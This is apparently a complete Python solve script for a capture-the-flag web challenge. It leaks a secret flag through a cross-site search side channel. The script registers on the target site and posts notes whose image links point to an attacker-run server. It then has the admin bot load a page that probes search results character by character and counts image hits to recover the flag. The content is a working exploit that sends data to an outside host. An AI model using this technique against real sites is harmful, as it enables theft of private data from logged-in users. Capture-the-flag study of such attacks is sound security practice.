#!/usr/bin/env python3

import logging
import requests

from collections import Counter
from flask import Flask
from pwn import log, os, sleep, string, sys, Thread


logging.getLogger('werkzeug').disabled = True
sys.modules['flask.cli'].show_server_banner = lambda *_: None

if len(sys.argv) != 4:
    log.error(f'Usage: python3 {sys.argv[0]} <victim-url> <vps-url> <bot-url>')

victim_url = sys.argv[1]
vps_url = sys.argv[2]
bot_url = sys.argv[3]

app = Flask(__name__)
s = requests.session()


@app.route('/', methods=['GET'])
def index():
    return f'''
<!doctype html>
<html>
  <head></head>
  <body>
    <script>
      const sleep = async msec => new Promise(resolve => setTimeout(resolve, msec));

      const leak = async () => {{
        const characters = '{string.ascii_lowercase}'

        for (const c of characters) {{
          await sleep(500)
          const w = open('{victim_url}/search?query={flag}' + c)
          await sleep(500)
          w.close()
        }}
      }}

      leak()
    </script>
  </body>
</html>
'''[1:]


hits = Counter()


@app.route('/image/<i>/<c>', methods=['GET'])
def image(i, c):
    hits[c] += 1
    return ''


def post_notes(title: str):
    for i in range(6):
        s.post(f'{victim_url}/add-post', data={
            'title': title,
            'content': 'asdf',
            'logo': f'{vps_url}/image/{i}/{title[-1]}',
        })


def main():
    global flag

    Thread(target=app.run, kwargs={
        'debug': False,
        'host': '0.0.0.0',
        'port': 8000,
        'use_reloader': False,
    }).start()

    credentials = {'username': 'asdf', 'password': 'fdsa'}
    s.post(f'{victim_url}/register', data=credentials)
    s.post(f'{victim_url}/login', data=credentials)

    flag = 'ackOn{'
    flag_progress = log.progress('Flag')

    while '}' not in flag:
        for c in string.ascii_lowercase:
            post_notes(flag + c)

        hits.clear()
        requests.post(f'{bot_url}/api/report', json={'url': vps_url, 'chall_url': victim_url + '/'})

        for c, count in hits.items():
            if count == 5:
                flag += c
                break
        else:
            flag += '}'

        flag_progress.status('H' + flag)

    flag = 'H' + flag
    flag_progress.success(flag)
    os._exit(0)

if __name__ == '__main__':
    main()
